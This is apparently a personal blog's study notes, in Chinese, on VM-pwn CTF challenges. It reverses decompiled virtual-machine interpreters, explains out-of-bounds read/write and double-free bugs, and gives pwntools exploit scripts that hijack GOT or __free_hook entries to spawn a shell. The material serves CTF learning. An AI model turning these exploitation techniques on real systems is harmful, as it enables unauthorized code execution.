---
title: VMPwn学习笔记
categories:
- VmPwn
---

# VMPwn学习笔记

## 前言

从ByteCTF第一次接触vmpwn以来一直这类题一直做不好，假期选了几道典型的做了一下，总结一下做题的基本思路。

## D^3CTF babyrop

### 程序分析

vm类题目一般都是模拟一个虚拟机，最关键的地方就是逆指令，这道题涉及到的寄存器较少，逆一下发现基本就是在模拟栈的push、pop、mov等操作，一般来说我们的思路是找到一个已知的libc地址，通过add offset把它改造成one_gadget，再用mov等指令移动到rip的位置。这道题就是这样。

开始程序在bss上找了块区域存放我们的指令和数据,在vm里会对0x202040数据进行处理。main_func里给了一堆switch case，我们可以看到`*global_addr2`起的应该是栈指针的作用，通过它的增减来模拟栈的增长或减少。`*(_QWORD *)global_addr3 = &v7;`使得`*(_QWORD *)global_addr3`存储栈地址，实际上是对这个栈进行操作，`*(_DWORD *)(global_addr3 + 0x10) = 10;`即`global_addr3[4]=10`这里的值10其实就是10*8=0x50，表示栈空间的大小。在后面的分支函数中被用来控制函数是否能成功调用。

```c
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  Init();
  my_read((__int64)&unk_202040, 0x100, '\n');
  main_func(&unk_202040, &unk_202140, (__int64)&unk_202150, (__int64)&unk_202148);
  exit(0);
}

signed __int64 __fastcall main_func(_QWORD *global_addr1, _QWORD *global_addr2, __int64 global_addr3, __int64 global_addr4)
{
  signed __int64 result; // rax
  _QWORD *global_addr41; // [rsp+0h] [rbp-80h]
  _DWORD *global_addr31; // [rsp+8h] [rbp-78h]
  char v7; // [rsp+20h] [rbp-60h]
  unsigned __int64 v8; // [rsp+78h] [rbp-8h]

  global_addr31 = (_DWORD *)global_addr3;
  global_addr41 = (_QWORD *)global_addr4;
  v8 = __readfsqword(0x28u);
  memset(&v7, 0, 0x50uLL);
  *(_QWORD *)global_addr3 = &v7;
  *(_DWORD *)(global_addr3 + 0x10) = 10;
  *(_QWORD *)(global_addr3 + 8) = *(_QWORD *)global_addr3 + 0x50LL;
  while ( *((_BYTE *)global_addr1 + *global_addr2) )
  {
    switch ( *((char *)global_addr1 + *global_addr2) )
    {
      case 0:
        *global_addr2 = 0LL;
        return 1LL;
      case 8:
        PushInt(global_addr31, *((char *)global_addr1 + ++*global_addr2));
        *global_addr2 += 4LL;
        break;
      case 0x12:
        PushByte(global_addr31, *((_BYTE *)global_addr1 + ++*global_addr2));
        ++*global_addr2;
        break;
      case 0x15:
        PushLongLong(global_addr31, *((char *)global_addr1 + ++*global_addr2));
        *global_addr2 += 8LL;
        break;
      case 0x21:
        MovEsp_Esp_1((_QWORD **)global_addr31);
        ++*global_addr2;
        break;
      case 0x26:
        AddEspVal((_QWORD **)global_addr31, *((_BYTE *)global_addr1 + ++*global_addr2));
        ++*global_addr2;
        break;
      case 0x28:
        ++*global_addr2;
        if ( !(unsigned int)AddStackPointer(global_addr31, global_addr41) )// add stack pointer
          exit(0);
        return result;
      case 0x30:
        SubRspVal((_QWORD **)global_addr31, *((_BYTE *)global_addr1 + ++*global_addr2));
        ++*global_addr2;
        break;
      case 0x34:
        ++*global_addr2;
        DoSth(global_addr31);
        break;
      case 0x38:
        ++*global_addr2;
        MovRspZero((__int64)global_addr31);
        break;
      case 0x42:
        MovRsp2(global_addr31);
        ++*global_addr2;
        break;
      case 0x51:
        AddItSelf((_QWORD **)global_addr31);
        ++*global_addr2;
        break;
      case 0x52:
        SubItSelf((_QWORD **)global_addr31);
        ++*global_addr2;
        break;
      case 0x56:
        SetValFromBuf((_QWORD **)global_addr31, *(_DWORD *)((char *)global_addr1 + ++*global_addr2));
        *global_addr2 += 4LL;
        break;
      default:
        exit(0);
        return result;
    }
  }
  return 1LL;
}

```

在这里有几个比较关键的函数，在逆向的时候就可以考虑到，首先是这个`AddStackPointer`可以往下增加栈指针，达到溢出的效果，我们的输入地址为`rbp-0x60`，这个函数一次将栈指针增加0x50，因此我们不能一次就达到目的，需要执行两次，但是这里有限制`!a1[4]`的时候会失败，而我们执行一次会让`a1[4] -= 10`初始值为10，所以要想办法改一下这个值，看看函数就会发现还是有很多，减到0再加个1即可。这样就突破了栈空间的限制。

```c
signed __int64 __fastcall AddStackPointer(_DWORD *a1, _QWORD *a2)
{
  if ( !a1[4] && *a2 > 1LL )
    return 0LL;
  *(_QWORD *)a1 += 80LL;                        // add rsp, 0x50;++val;
  a1[4] -= 10;
  ++*a2;
  return 1LL;
}

```

### 漏洞利用

有了上面的函数只能算是有了第一步，我们还得构造出one_gadget出来，调试一下看栈空间，是我们第一次加0x50后的栈内容，0x*bd8为返回地址，我们调用两次这个stack_pointer_add到0x*c10。在其上方0x*bf8有个libc相关的地址通过`PushLongLong`函数让栈指针上移，push一个`offset`到这个libc所在栈+8的位置再用`AddEsp_Esp_1`将其相加得到`one_gadget`地址，最后多次执行`DoSth`把其换到`retn_addr`所在位置(注意我们使用的gaeget的条件是`rsp+0x30=NULL`所以中间有一步`mov [rsp+8], 0`是为了让gadget满足条件)

![stack](./1.png)

```c
signed __int64 __fastcall PushLongLong(_DWORD *a1, __int64 a2)
{
  if ( a1[4] > 9u )
    exit(0);
  *(_QWORD *)a1 -= 8LL;
  **(_QWORD **)a1 = a2;
  ++a1[4];
  return 1LL;
}

signed __int64 __fastcall AddEsp_Esp_1(_QWORD **a1)
{
  **a1 += *(*a1 - 1);
  *(*a1 - 1) = 0LL;                             // add [esp],[esp-8];mov [esp-8],0;
  return 1LL;
}

signed __int64 __fastcall DoSth(_DWORD *a1)
{
  _DWORD *v1; // ST08_8

  v1 = a1;
  ++a1[4];
  *(_QWORD *)v1 -= 8LL;
  **(_QWORD **)v1 = *(_QWORD *)(*(_QWORD *)v1 + 8LL);// mov [rsp-8],[rsp]; mov [rsp],0;
  *(_QWORD *)(*(_QWORD *)a1 + 8LL) = 0LL;
  return 1LL;
}

```

### exp.py

exp来自官方wp

```py
from pwn import *
r = process('./babyrop')
#r = remote('')
context.log_level = 'debug'
context.terminal = ['tmux','split','-h']

gdb.attach(r)
payload =  chr(0x28)                 #pop10
payload += chr(0x15) + p64(0)        #push 1
payload += chr(0x28)                 #pop10
payload += chr(0x38)                 #mov [rsp+8],0
payload += chr(0x56) + p32(0x24a3a)  #mov [rsp],0x24a3a
payload += chr(0X34)                 #mov [rsp-8],[rsp]   rsp -=8
payload += chr(0x21)                 #add [rsp-8],[rsp]
payload += chr(0X34)*5               #mov [rsp-8],[rsp]   rsp -=8

r.sendline(payload)
r.interactive()
```

## CISCN2019 Virtual

### 前言

剩下两篇是看0xC4m3l师傅在先知发的博客学习的，此为第一篇

### 程序分析

程序在堆上分配了几块内存用来存放数据指令和输出，其中指令以空格区分开，在提取指令的函数里给了我们实现功能的提示，这里是将`ptr`的输入指令流提取到`ins`里。对照着我们可以在`main_method`里确定函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *s; // [rsp+18h] [rbp-28h]
  node *stack_data; // [rsp+20h] [rbp-20h]
  void **ins; // [rsp+28h] [rbp-18h]
  void **output; // [rsp+30h] [rbp-10h]
  char *ptr; // [rsp+38h] [rbp-8h]

  sub_401DA9();
  s = (char *)malloc(0x20uLL);
  stack_data = MyMalloc(0x40);
  ins = (void **)MyMalloc(0x80);
  output = (void **)MyMalloc(0x40);
  ptr = (char *)malloc(0x400uLL);
  puts("Your program name:");
  my_read((__int64)s, 0x20u);
  puts("Your instruction:");
  my_read((__int64)ptr, 0x400u);
  ExtractIns((__int64)ins, ptr);
  puts("Your stack data:");
  my_read((__int64)ptr, 0x400u);
  PutData((__int64)stack_data, ptr);
  if ( (unsigned int)main_method((__int64)ins, (__int64)stack_data, (__int64)output) )
  {
    puts("-------");
    puts(s);
    MyPuts(stack_data);
    puts("-------");
  }
  else
  {
    puts("Your Program Crash :)");
  }
  free(ptr);
  FreeAll(ins);
  FreeAll((void **)stack_data);
  FreeAll(output);
  return 0LL;
}

void __fastcall ExtractIns(__int64 malloc_chunk, char *ptr1)
{
  int v2; // [rsp+18h] [rbp-18h]
  int i; // [rsp+1Ch] [rbp-14h]
  const char *s1; // [rsp+20h] [rbp-10h]
  _QWORD *ptr; // [rsp+28h] [rbp-8h]

  if ( malloc_chunk )
  {
    ptr = malloc(8LL * *(signed int *)(malloc_chunk + 8));
    v2 = 0;
    for ( s1 = strtok(ptr1, delim); v2 < *(_DWORD *)(malloc_chunk + 8) && s1; s1 = strtok(0LL, delim) )
    {
      if ( !strcmp(s1, "push") )
      {
        ptr[v2] = 0x11LL;
      }
      else if ( !strcmp(s1, "pop") )
      {
        ptr[v2] = 0x12LL;
      }
      else if ( !strcmp(s1, "add") )
      {
        ptr[v2] = 0x21LL;
      }
      else if ( !strcmp(s1, "sub") )
      {
        ptr[v2] = 0x22LL;
      }
      else if ( !strcmp(s1, "mul") )
      {
        ptr[v2] = 0x23LL;
      }
      else if ( !strcmp(s1, "div") )
      {
        ptr[v2] = 0x24LL;
      }
      else if ( !strcmp(s1, "load") )
      {
        ptr[v2] = 0x31LL;
      }
      else if ( !strcmp(s1, "save") )
      {
        ptr[v2] = 0x32LL;
      }
      else
      {
        ptr[v2] = 0xFFLL;
      }
      ++v2;
    }
    for ( i = v2 - 1; i >= 0 && (unsigned int)PutInstruction((node *)malloc_chunk, ptr[i]); --i )
      ;
    free(ptr);
  }
}

__int64 __fastcall main_method(__int64 ins, __int64 data, __int64 output)
{
  node *output1; // [rsp+8h] [rbp-28h]
  unsigned int v5; // [rsp+24h] [rbp-Ch]
  __int64 choice; // [rsp+28h] [rbp-8h]

  output1 = (node *)output;
  v5 = 1;
  while ( v5 && (unsigned int)MyPop((node *)ins, &choice) )
  {
    switch ( choice )
    {
      case 17LL:
        v5 = Push(output1, data);               // push
        break;
      case 18LL:
        v5 = Pop((__int64)output1, data);       // pop
        break;
      case 33LL:
        v5 = Add((__int64)output1);             // add
        break;
      case 34LL:
        v5 = Sub((__int64)output1);             // sub
        break;
      case 35LL:
        v5 = Mul((__int64)output1);             // mul
        break;
      case 36LL:
        v5 = Div((__int64)output1);             // div
        break;
      case 49LL:
        v5 = Load(output1);                     // load
        break;
      case 50LL:
        v5 = Save(output1);                     // save
        break;
      default:
        v5 = 0;
        break;
    }
  }
  return v5;
}

```

### 漏洞分析

因为写博客的时候距离做题过去了很久函数什么的已经弄不太清了所以函数就不怎么细讲了，这里直接看产生漏洞的函数，res是我们可控的输入数据，这里没有检查，因此可以越界写数据。基本思路是越界写把`output`的`node`的`chunk_addr`改成`puts@got`，再计算system和puts的实际地址，将差值通过`add`加回去，最终push回去，从而hijack got表地址，在puts程序名的时候执行system函数。这个题困扰我的是调整栈平衡Blabla总之简单的exp写了很久。

```c
signed __int64 __fastcall Save(node *output)
{
  __int64 res; // [rsp+10h] [rbp-10h]
  __int64 v3; // [rsp+18h] [rbp-8h]

  if ( !(unsigned int)MyPop(output, &res) || !(unsigned int)MyPop(output, &v3) )
    return 0LL;
  *(_QWORD *)(8 * (output->idx + res) + output->chunk_addr) = v3;// 越界
  return 1LL;
}

```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./pwn')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./pwn')

else:
    libc = ELF('./x64_libc.so.6')
    p = remote('f.buuoj.cn',20173)

def exp():
    #leak libc
    gdb.attach(p,'b* 0x401d98')
    p.recvuntil("Your program name:")
    p.sendline("/bin/sh\x00")
    p.recvuntil("Your instruction:")
    p.sendline("push push push save push push pop add push")
    p.recvuntil("Your stack data:")
    payload = "1 "+str(elf.got['puts']) + " " + str(-4) + " " + str(0x7f3838d52390-0x7f3838d7c690) +" "+ "1 "*5
    p.sendline(payload)
    p.interactive()

exp()
```

## OGEEK Final OVM

### 程序分析

是OGEEK线下决赛的一道vmpwn，bss上分配了一块区域放寄存器，其中`reg[13]`为`sp`，`reg[15]`为`pc`寄存器。execute将输入数据(四字节)分成1234四个字节，最高字节表示`commnd`，之后是reg[three]和reg[two]以及reg[one]的运算，其中有输出寄存器内容的地方。

在choice分别为0x60和0x70的时候没有检查值的范围导致越界读写，我们可以通过sub等功能输入负数进去从而存储got表的值到reg里最终泄露出Libc地址，需要注意的是我们操作的单位都是4字节，因此我们需要泄露两组reg，之后通过add或者sub加上offset得到`__free_hook-8`的地址写到`comment[0]`，read的时候输入"/bin/sh\x00+system_addr"最后sendmsg会free(comment[0])即可get shell。

```c

int __cdecl main(int argc, const char **argv, const char **envp)
{
  unsigned __int16 code_size; // [rsp+2h] [rbp-Eh]
  unsigned __int16 pc; // [rsp+4h] [rbp-Ch]
  unsigned __int16 _sp; // [rsp+6h] [rbp-Ah]
  int a1; // [rsp+8h] [rbp-8h]
  int i; // [rsp+Ch] [rbp-4h]

  comment[0] = malloc(0x8CuLL);
  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  signal(2, (__sighandler_t)signal_handler);
  write(1, "WELCOME TO OVM PWN\n", 0x16uLL);
  write(1, "PC: ", 4uLL);
  _isoc99_scanf("%hd", &pc);
  getchar();
  write(1, "SP: ", 4uLL);
  _isoc99_scanf("%hd", &_sp);
  getchar();
  reg[13] = _sp;
  reg[15] = pc;
  write(1, "CODE SIZE: ", 0xBuLL);
  _isoc99_scanf("%hd", &code_size);
  getchar();
  if ( _sp + (unsigned int)code_size > 0x10000 || !code_size )
  {
    write(1, "EXCEPTION\n", 0xAuLL);
    exit(155);
  }
  write(1, "CODE: ", 6uLL);
  running = 1;
  for ( i = 0; code_size > i; ++i )
  {
    _isoc99_scanf("%d", &memory[pc + i]);
    if ( (memory[i + pc] & 0xFF000000) == 0xFF000000 )
      memory[i + pc] = 0xE0000000;
    getchar();
  }
  while ( running )
  {
    a1 = fetch();
    execute(a1);
  }
  write(1, "HOW DO YOU FEEL AT OVM?\n", 0x1BuLL);
  read(0, comment[0], 0x8CuLL);
  sendcomment(comment[0]);
  write(1, "Bye\n", 4uLL);
  return 0;
}

void __fastcall execute(int a1)
{
  int v1; // eax
  unsigned __int8 one_byte; // [rsp+18h] [rbp-8h]
  unsigned __int8 two_byte; // [rsp+19h] [rbp-7h]
  unsigned __int8 three_byte; // [rsp+1Ah] [rbp-6h]
  signed int i; // [rsp+1Ch] [rbp-4h]

  three_byte = (a1 & 0xF0000u) >> 16;           // three byte
  two_byte = (unsigned __int16)(a1 & 0xF00) >> 8;
  one_byte = a1 & 0xF;
  if ( HIBYTE(a1) == 0x70 )
  {
    reg[three_byte] = reg[one_byte] + reg[two_byte];
    return;
  }
  if ( (signed int)HIBYTE(a1) > 0x70 )
  {
    if ( HIBYTE(a1) == 0xB0 )
    {
      reg[three_byte] = reg[one_byte] ^ reg[two_byte];
      return;
    }
    if ( (signed int)HIBYTE(a1) > 0xB0 )
    {
      if ( HIBYTE(a1) == 0xD0 )
      {
        reg[three_byte] = reg[two_byte] >> reg[one_byte];
        return;
      }
      if ( (signed int)HIBYTE(a1) > 0xD0 )
      {
        if ( HIBYTE(a1) == 0xE0 )
        {
          running = 0;
          if ( !reg[13] )
          {
            write(1, "EXIT\n", 5uLL);
            return;
          }
        }
        else if ( HIBYTE(a1) != 0xFF )          // 先设置为0xff
        {
          return;
        }
        running = 0;
        for ( i = 0; i <= 15; ++i )
          printf("R%d: %X\n", (unsigned int)i, (unsigned int)reg[i]);
        write(1, "HALT\n", 5uLL);
      }
      else if ( HIBYTE(a1) == 0xC0 )
      {
        reg[three_byte] = reg[two_byte] << reg[one_byte];
      }
    }
    else
    {
      switch ( HIBYTE(a1) )
      {
        case 0x90u:
          reg[three_byte] = reg[one_byte] & reg[two_byte];
          break;
        case 0xA0u:
          reg[three_byte] = reg[one_byte] | reg[two_byte];
          break;
        case 0x80u:
          reg[three_byte] = reg[two_byte] - reg[one_byte];
          break;
      }
    }
  }
  else if ( HIBYTE(a1) == 0x30 )
  {
    reg[three_byte] = memory[reg[one_byte]];    // get val
  }
  else if ( (signed int)HIBYTE(a1) > 0x30 )
  {
    switch ( HIBYTE(a1) )
    {
      case 0x50u:
        v1 = reg[13];
        reg[13] = v1 + 1;
        stack[v1] = reg[three_byte];
        break;
      case 0x60u:
        reg[three_byte] = stack[--reg[13]];     // stack
        break;
      case 0x40u:
        memory[reg[one_byte]] = reg[three_byte];// useful
        break;
    }
  }
  else if ( HIBYTE(a1) == 0x10 )
  {
    reg[three_byte] = (unsigned __int8)a1;
  }
  else if ( HIBYTE(a1) == 0x20 )
  {
    reg[three_byte] = (_BYTE)a1 == 0;
  }
}
/* Orphan comments:
add
*/
```

### exp.py

```py
#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='debug')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./ovm')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
if debug:
    p = process('./ovm')
    gadgets = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]
else:
    gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]
    p = remote('node3.buuoj.cn',28129)

def Splice(choice,three_byte,two_byte,one_byte):
    return str((choice << 24) + (three_byte << 16) + (two_byte << 8) + (one_byte & 0xf))

stack_addr = 0x2420a0
reg_addr = 0x242060
memory_add = 0x202060

def exp():
    #leak libc
    p.recvuntil("PCPC: ")
    p.sendline("0")
    p.recvuntil("SP: ")
    p.sendline("0")
    p.recvuntil("CODE SIZE: ")
    p.sendline("18")
    p.recvuntil("CODE: ")
    write_got = elf.got['write']
    offset = (stack_addr-write_got) / 4
    off_free_setbuf = libc.sym['__free_hook'] - libc.sym['setbuf'] - 8
    log.info("[+] offset between free_hook and setbuf is " + hex(off_free_setbuf))
    #gdb.attach(p)
    #first set some reg == printf_got_addr
    #second set comment = free_hook - 8
    #trigger the leak
    #one
    code = [
            0x10041,
            0x3000000d,
            0x80000100,
            0xa00d0000,
            0x60020000,
            0x60030000,
            0x60040000,
            0x80060f07,#put 8 to reg[6]
            0x60050000,
            0x80070806,#put -8 to reg[7]
            #set to free_hook-8
            0x3008000f,
            off_free_setbuf,
            0x70040408,#set reg[4] = __free_hook-8
            0x40040007,
            #set reg[13]=reg[7]
            0x800d070a,
            #reg[13]++
            0x50000000,
            0x4005000d,
            0xe0000000
            #set to trigger 0xff
            ]
    for i in code:
	sleep(0.01)
	p.sendline(str(i))
    #
    p.recvline()
    p.recvline()
    #p.recvuntil("R2: ")
    #print res
    low = int(p.recvline().strip('\n')[4:],16)
    high = int(p.recvline().strip('\n')[4:],16)
    libc_base = ((high<<32)+low) - libc.sym['printf']
    libc.address = libc_base
    log.success("libc base => " + hex(libc_base))
    #
    p.recvuntil("HOW DO YOU FEEL AT OVM?")
    p.sendline("/bin/sh\x00"+p64(libc.sym['system']))
    p.interactive()

exp()

```

## RedHat线下粤湾银行

### 程序分析

32位程序，new就分配堆空间存储数据，每次分配0x2c的空间来做各种计算，play就取数据分析，free就释放分配的空间，这里有double free。

```c
00000000
00000000 node            struc ; (sizeof=0x2C, mappedto_7)
00000000 idx0            dd ?
00000004 idx1            dd ?
00000008 idx2            dd ?
0000000C idx3            dd ?
00000010 idx4            dd ?
00000014 idx5            dd ?
00000018 calloc_addr_fc  dd ?
0000001C calloc_addr_fc1 dd ?
00000020 malloc_addr     dd ?
00000024 idx9            dd ?
00000028 calloc_addr     dd ?
0000002C node            ends

void __cdecl __noreturn main()
{
  int choice; // eax
  void *buf; // ST1C_4
  node *ptr; // [esp+8h] [ebp-10h]

  Init();
  ptr = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        choice = menu();
        if ( choice != 2 )
          break;
        if ( ptr )
          play(ptr);
        else
          puts("NOT FOUND!");
      }
      if ( choice > 2 )
        break;
      if ( choice != 1 )
        goto LABEL_18;
      ptr = new();
      buf = malloc(0x200u);
      read(0, buf, 0x1FFu);
      printf("gift:%x%x\n", ptr->calloc_addr & 0xFFF, (unsigned __int16)ptr & 0xFFF);
      ptr->malloc_addr = (int)buf;
    }
    if ( choice != 3 )
    {
      if ( choice == 4 )
      {
        puts("bye!");
        exit(0);
      }
LABEL_18:
      exit(-1);
    }
    if ( ptr )
    {
      free((void *)ptr->calloc_addr);
      free(ptr);                                // double free
    }
    else
    {
      puts("NOT FOUND!");
    }
  }
}
```

new的node大概如上面所示。play是主要函数。在0x10可以读写idx3，在0x40/0x43处可以越界设置idx3的值，我们设置为put@got之后putchar泄露低位，再使got地址自增1继续泄露，最终泄露得到libc，同理可以用putchar设置free@got的值为system，设置ptr->idx0为"/bin"，ptr->idx为"/sh\x00"，最后free的时候触发system("/bin/sh\x00")

```c
node *new()
{
  node *node_addr; // eax
  node *v1; // ST1C_4

  node_addr = (node *)malloc(0x2Cu);
  v1 = node_addr;
  node_addr->idx0 = 0;
  node_addr->idx1 = 0;
  node_addr->idx2 = 0;
  node_addr->idx3 = 0;
  node_addr->idx4 = 0;
  node_addr->idx5 = 0;
  node_addr->idx9 = 0;
  node_addr->calloc_addr = (int)calloc(4u, 0x40u);
  v1->calloc_addr_fc = v1->calloc_addr + 0xFC;
  v1->calloc_addr_fc1 = v1->calloc_addr + 0xFC;
  v1->malloc_addr = 0;
  return v1;
}

node *__cdecl play(node *node_addr)
{
  int choice; // eax
  unsigned __int8 v2; // ST18_1
  unsigned __int8 v3; // ST1A_1
  unsigned __int8 *v4; // eax
  unsigned __int8 v5; // ST1D_1
  char v6; // ST1E_1
  unsigned __int8 v7; // ST1F_1
  unsigned __int8 *v8; // eax
  unsigned __int8 v9; // ST22_1
  _BYTE *v10; // ebx
  unsigned __int8 *v11; // eax
  unsigned __int8 *v12; // eax
  unsigned __int8 v13; // ST24_1
  unsigned __int8 *v14; // eax
  unsigned __int8 v15; // ST27_1
  unsigned __int8 *v16; // eax
  unsigned __int8 v17; // ST2A_1
  unsigned __int8 *v18; // eax
  unsigned __int8 v19; // ST2D_1
  unsigned __int8 *v20; // eax
  node *result; // eax
  int v22; // edx
  int v23; // edx
  int v24; // edx
  int v25; // edx
  unsigned __int8 v26; // [esp+21h] [ebp-27h]
  unsigned __int8 v27; // [esp+22h] [ebp-26h]
  unsigned __int8 v28; // [esp+23h] [ebp-25h]
  unsigned int v29; // [esp+3Ch] [ebp-Ch]

  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )                               // 0x0*
      {
        choice = *(_BYTE *)node_addr->malloc_addr & 0xF0;
        if ( choice != 0x70 )
          break;
        if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
        {
          if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )// 0xf3
            exit(-1);
          node_addr->calloc_addr_fc -= 4;
          *(_DWORD *)node_addr->calloc_addr_fc = *(_DWORD *)(node_addr->malloc_addr + 1);
          node_addr->malloc_addr += 5;
        }
        else                                    // 0xf0
        {
          node_addr->calloc_addr_fc -= 4;
          *(_DWORD *)node_addr->calloc_addr_fc = *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 1u));
          node_addr->malloc_addr += 2;
        }
      }
      if ( choice > 0x70 )
        break;
      if ( choice == 0x30 )                     // 0x30
      {
        v12 = (unsigned __int8 *)GetReg(node_addr, 1u);
        --*(&node_addr->idx0 + *v12);
        node_addr->malloc_addr += 2;
      }
      else if ( choice > 0x30 )
      {
        switch ( choice )
        {
          case 0x50:
            if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
            {
              if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )
                exit(-1);
              v18 = (unsigned __int8 *)GetReg(node_addr, 1u);// 0x53
              *(&node_addr->idx0 + *v18) -= *(_DWORD *)(node_addr->malloc_addr + 2);
              node_addr->malloc_addr += 6;
            }
            else
            {
              v17 = *(_BYTE *)GetReg(node_addr, 1u);// 0x50->Sub
              *(&node_addr->idx0 + v17) -= *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 2u));
              node_addr->malloc_addr += 3;
            }
            break;
          case 0x60:
            if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
            {
              if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )
                exit(-1);
              v20 = (unsigned __int8 *)GetReg(node_addr, 1u);// 0x63->Mul
              *(&node_addr->idx0 + *v20) *= *(_DWORD *)(node_addr->malloc_addr + 2);
              node_addr->malloc_addr += 6;
            }
            else
            {
              v19 = *(_BYTE *)GetReg(node_addr, 1u);
              *(&node_addr->idx0 + v19) *= *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 2u));
              node_addr->malloc_addr += 3;
            }
            break;
          case 0x40:
            if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
            {
              if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )
                exit(-1);
              v14 = (unsigned __int8 *)GetReg(node_addr, 1u);// 0x43->Add
              *(&node_addr->idx0 + *v14) += *(_DWORD *)(node_addr->malloc_addr + 2);
              node_addr->malloc_addr += 6;
            }
            else
            {
              v13 = *(_BYTE *)GetReg(node_addr, 1u);
              *(&node_addr->idx0 + v13) += *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 2u));
              node_addr->malloc_addr += 3;
            }
            break;
          default:
            goto LABEL_121;
        }
      }
      else if ( choice == 0x10 )
      {
        if ( *(_BYTE *)(node_addr->malloc_addr + 1) )
        {
          if ( *(_BYTE *)(node_addr->malloc_addr + 1) != 1 )
            exit(-1);
          putchar(*(char *)node_addr->idx3);    // 0x10->show
          node_addr->malloc_addr += 2;
        }
        else
        {
          v10 = (_BYTE *)node_addr->idx3;
          *v10 = getchar();
          node_addr->malloc_addr += 2;
        }
      }
      else if ( choice == 0x20 )
      {
        v11 = (unsigned __int8 *)GetReg(node_addr, 1u);
        ++*(&node_addr->idx0 + *v11);           // 0x20->++
        node_addr->malloc_addr += 2;
      }
      else
      {
        if ( *(_BYTE *)node_addr->malloc_addr & 0xF0 )
          goto LABEL_121;
        if ( *(_BYTE *)node_addr->malloc_addr & 0xF )// 0x0*
        {
          switch ( *(_BYTE *)node_addr->malloc_addr & 0xF )
          {
            case 1:
              v3 = *(_BYTE *)GetReg(node_addr, 1u);
              v4 = (unsigned __int8 *)GetReg(node_addr, 2u);
              *(&node_addr->idx0 + v3) = *(_DWORD *)GetNewHeapAddr(
                                                      node_addr,
                                                      *v4,
                                                      *(char *)(node_addr->malloc_addr + 3));
              node_addr->malloc_addr += 4;
              break;
            case 2:
              v5 = *(_BYTE *)GetReg(node_addr, 1u);
              v6 = *(_BYTE *)(node_addr->malloc_addr + 2);
              v7 = *(_BYTE *)GetReg(node_addr, 3u);
              *(_DWORD *)GetNewHeapAddr(node_addr, v5, v6) = *(&node_addr->idx0 + v7);
              node_addr->malloc_addr += 4;
              break;
            case 4:
              v8 = (unsigned __int8 *)GetReg(node_addr, 1u);
              v9 = *(_DWORD *)(node_addr->malloc_addr + 3);
              *(_DWORD *)GetNewHeapAddr(node_addr, *v8, *(char *)(node_addr->malloc_addr + 2)) = v9;
              node_addr->malloc_addr += 7;
              break;
            default:
              if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )
                exit(-1);
              *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 1u)) = *(_DWORD *)(node_addr->malloc_addr + 2);
              node_addr->malloc_addr += 6;
              break;
          }
        }
        else
        {
          v2 = *(_BYTE *)GetReg(node_addr, 1u);
          *(&node_addr->idx0 + v2) = *(&node_addr->idx0 + *(unsigned __int8 *)GetReg(node_addr, 2u));
          node_addr->malloc_addr += 3;
        }
      }
    }
    if ( choice == 0xB0 )
      break;
    if ( choice > 0xB0 )
    {
      if ( choice == 0xD0 )
      {
        if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
        {
          if ( (*(_BYTE *)node_addr->malloc_addr & 0xF) != 3 )
            exit(-1);
          v28 = *(_BYTE *)GetReg(node_addr, 1u);// 0xd3
          v29 = *(_DWORD *)(node_addr->malloc_addr + 2);
          node_addr->idx9 = 0;
          if ( *(&node_addr->idx0 + v28) == v29 )
            node_addr->idx9 |= 0x100000u;
          if ( *(&node_addr->idx0 + v28) > v29 )
            node_addr->idx9 |= 0x80000u;
          if ( *(&node_addr->idx0 + v28) < v29 )
            node_addr->idx9 |= 0x40000u;
          node_addr->malloc_addr += 6;
        }
        else
        {
          v26 = *(_BYTE *)(node_addr->malloc_addr + 1);// 0xd0
          v27 = *(_BYTE *)(node_addr->malloc_addr + 2);
          node_addr->idx9 = 0;
          if ( *(&node_addr->idx0 + v26) == *(&node_addr->idx0 + v27) )
            node_addr->idx9 |= 0x100000u;
          if ( (unsigned int)*(&node_addr->idx0 + v26) > *(&node_addr->idx0 + v27) )
            node_addr->idx9 |= 0x80000u;
          if ( (unsigned int)*(&node_addr->idx0 + v26) < *(&node_addr->idx0 + v27) )
            node_addr->idx9 |= 0x40000u;
          node_addr->malloc_addr += 3;
        }
      }
      else if ( choice == 0xF0 )
      {
        if ( *(_BYTE *)node_addr->malloc_addr & 0xF )
        {
          switch ( *(_BYTE *)node_addr->malloc_addr & 0xF )
          {
            case 1:
              if ( node_addr->idx9 & 0x100000 )
                v23 = node_addr->malloc_addr + 2;
              else
                v23 = *(char *)(node_addr->malloc_addr + 1) + node_addr->malloc_addr;
              node_addr->malloc_addr = v23;
              break;
            case 2:
              if ( node_addr->idx9 & 0x80000 )
                v24 = *(char *)(node_addr->malloc_addr + 1) + node_addr->malloc_addr;
              else
                v24 = node_addr->malloc_addr + 2;
              node_addr->malloc_addr = v24;
              break;
            case 3:
              if ( node_addr->idx9 & 0x40000 )
